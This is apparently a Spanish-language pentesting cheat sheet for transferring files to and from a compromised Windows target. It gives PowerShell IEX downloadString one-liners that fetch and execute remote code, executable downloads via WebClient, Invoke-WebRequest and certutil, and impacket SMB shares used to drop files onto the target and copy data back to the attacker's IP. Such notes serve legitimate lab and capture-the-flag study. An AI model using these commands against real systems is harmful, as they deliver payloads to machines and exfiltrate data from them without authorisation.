** Internet Explorer desde cli con Powershell **
`IEX(New-Object Net.WebClient).downloadString('http://<own_ip>:<puerto>/archivo')`

** Desde Powershell **
`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<own_ip>:80/bill.exe', 'C:\Users\Kostas\Desktop\bfill.exe')"`

`powershell Invoke-WebRequest "http://<own_ip>:80/bill.exe" -OutFile "C:\Users\Kostas\Desktop\bfill.exe"`

`Invoke-WebRequest http://10.10.14.6:8000/PowerUp.ps1 -o PowerUp.ps1`

** Transferencia con Powershell a un entorno de 64 bits **
`start /b C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<own_ip>:<puerto>/archivo'`

** Transferencia desde cmd **
certutil.exe --> Parte de Certificate Server de Windows, para volcar y mostrar la info de configuración de la entidad de certificados (CA), configuración de servicios de CA, realizar copias de seguridad, restaurar componentes de CA y comprobar certificados, pares de claves y cadenas de certificados.
`certutil.exe -f -urlcache -split http://<own_ip>:<puerto>/bfill.exe bfill.exe`

** Transferencia con el protocolo SMB creando una unidad logico-fisica **
>Crear una unidad lógica en la máquina local
>Servidor samba que comparte directorio smbFolder que está en nuestro directorio $(pwd)
>`impacket-smbserver smbFolder $(pwd)`
>Sincronizar unidad lógica con la unidad lógica en la máquina Windows objetivo
>`New-PSDrive -Name "ShareFolder" -PSProvider "FileSystem" -Root "\\<own_ip>\smbFolder"`
>Accedemos a la unidad física en Windows objetivo
>Listará los archivos de smbFolder en máquina local
>`dir ShareFolder:\`
>Copiar el archivo que queremos
>`copy ShareFolder:\bfill.exe C:\Users\Kostas\Desktop\bfill.exe`

** Transferir archivo en máquina objetivo (Windows) a máquina local **
> Montar servidor SMB:
> `impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar`
> Autenticarse desde Windows (máquina objetivo) a servidor SMB en en máquina local.
> `net use \\10.10.14.6\smbFolder /u:s4vitar s4vitar`
> Transferir archivo:
> `copy checks.txt \\10.10.14.6\smbFolder\checks.txt`


